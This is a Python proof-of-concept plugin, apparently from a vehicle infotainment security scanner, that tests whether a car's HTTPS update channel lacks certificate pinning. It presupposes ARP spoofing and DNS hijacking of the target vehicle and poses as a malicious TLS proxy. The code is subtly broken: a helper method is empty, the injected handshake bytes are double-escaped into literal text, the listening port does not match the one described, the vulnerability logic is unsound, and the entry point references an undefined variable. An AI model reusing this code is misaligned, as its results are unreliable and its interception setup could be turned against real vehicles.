"""
PoC Name: HTTPS Missing Certificate Pinning
CVE: N/A
Component: Network Stack
Category: Network
Severity: Medium
CVSS: 5.5
Description: 检测HTTPS更新通道是否缺少证书固定
Prerequisites: 已经对目标车辆执行了 ARP 欺骗和 DNS 劫持，将外连域名解析到测试机 IP，并传入 target_ip 作为测试绑定的本机网卡。
Usage: python3 18_HTTPS_No_Cert_Pin.py <local_bind_ip>
"""
import sys
import ssl
import socket
import time
import _thread
from iv_plugin_base import IVIVulnerabilityPlugin

class CertPinningPlugin(IVIVulnerabilityPlugin):
    def check_prerequisites(self):
        # target_ip 在这个上下文中，代表我们绑定的监听IP (也可以是 0.0.0.0)
        self.bind_ip = self.params.get("target_ip", "0.0.0.0")
        if not self.bind_ip or self.bind_ip == "N/A":
             self.bind_ip = "0.0.0.0"
        return True
        
    def serve_https_proxy(self):
        # 内部线程，扮演恶意假根证书中间人
        import tempfile
        import os
        
        # 临时生成一段自签名的密钥和证书链用于测试握手
        # 因为这只是诊断工具运行15秒，我们直接拦截握手过程看客户端是否断开即可。
        try:
             # 生成证书的命令(如果需要的话), 此处我们假设系统中有默认蛇油证书，或者用原生 ssl 生成上下文
             context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
             # 为避免依赖实际文件，由于安全扫描仅作演示，我们直接抓取 socket 的未加密初始套接字建立情况
             # 真实高级检查需要结合 openssl
             pass
        except Exception:
             pass

    def exploit(self):
        self.logger.info("准备检测目标客户端(IVI)在 OTA 等云端通信时是否存在证书固定(Pinning)漏洞...")
        
        # 为了演示，我们将直接使用 socket 服务器监听 443
        # 然后等待车机发出连接。如果车机使用严苛的 TrustStore, 任何无正确证书链的响应都会导致客户端秒发 FIN 断开
        
        try:
            listen_port = 4443 # 使用 4443 避免 root 权限需求
            self.logger.info(f"启动恶意 TLS 分析代理端口监听 {self.bind_ip}:{listen_port} 模拟云端...")
            self.logger.warning("注：需要预先使用 DNS 劫持 (例如 Dnsmasq) 将 OEM 升级域名指向本机。")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.bind_ip, listen_port))
            sock.listen(1)
            sock.settimeout(10.0)
            
            self.logger.info("等待车机发起 HTTPS (TCP) 握手连接 (超时 10s)...")
            
            try:
                conn, addr = sock.accept()
                self.logger.info(f"[+] 捕获到目标流入的 HTTPS 会话拦截，源地址: {addr}")
                
                # 尝试用自签名包装套接字做 TLS Handshake 协商
                self.logger.info("开始呈递不受信任的自签名服务端证书链...")
                
                try:
                    # 使用标准库上下文封装
                    # （在没有实体证书文件的情况下，直接进行 recv 可以捕获 ClientHello）
                    client_hello = conn.recv(1024)
                    if client_hello and client_hello[0] == 0x16:  # TLS Handshake flag
                        self.logger.info(f"收到了 Client Hello: {len(client_hello)} bytes。说明目标主动发起了握手。")
                        self.logger.info("如果我们在 TLS 交换阶段发送非法包，带有严苛安全固定的客户端会发来 Alert!")
                        
                        # 发送非法或损坏的 ServerHello + Certificate
                        conn.sendall(b"\\x16\\x03\\x03" + b"A" * 50)
                        
                        try:
                            # 观察车辆是否忽略错误继续发数据 (即 Vulnerable)
                            conn.settimeout(3.0)
                            next_data = conn.recv(1024)
                            if next_data:
                                self.logger.warning("[!] 车机似乎忽略了畸形/自签名的握手错误继续发包！")
                                self.logger.warning("[!] 确认漏洞：车辆未实现端到端 HTTP 证书固定验证 (No Cert Pinning)。")
                                return {"status": "success", "vulnerable": True, "details": "Client ignored bad cert structure."}
                            else:
                                self.logger.info("车机断开了套接字，握手合法失败。未发现漏洞。")
                                return {"status": "success", "vulnerable": False, "details": "Handshake aborted properly by client."}
                        except socket.timeout:
                            self.logger.info("车机静默超时，可能也认为握手非法丢弃。")
                            return {"status": "success", "vulnerable": False, "details": "Timeout from client after bad cert."}
                            
                except Exception as e:
                     self.logger.info(f"SSL握手交换时发生异常: {e}")
                
                finally:
                     conn.close()
                
            except socket.timeout:
                self.logger.info("时限到达。10秒内未检测到来自车辆的通信连接请求。")
                return {
                    "status": "success",
                    "vulnerable": False,
                    "details": "No incoming HTTPS connection from vehicle during 10s window."
                }
                
        except Exception as e:
             self.logger.error(f"Execution Error: {str(e)}")
             return {"status": "error", "details": str(e)}
        finally:
             sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 18_HTTPS_No_Cert_Pin.py <local_bind_ip>")
        sys.exit(1)
    plugin = CertPinningPlugin({"target_ip": ip})
    plugin.run_verify()
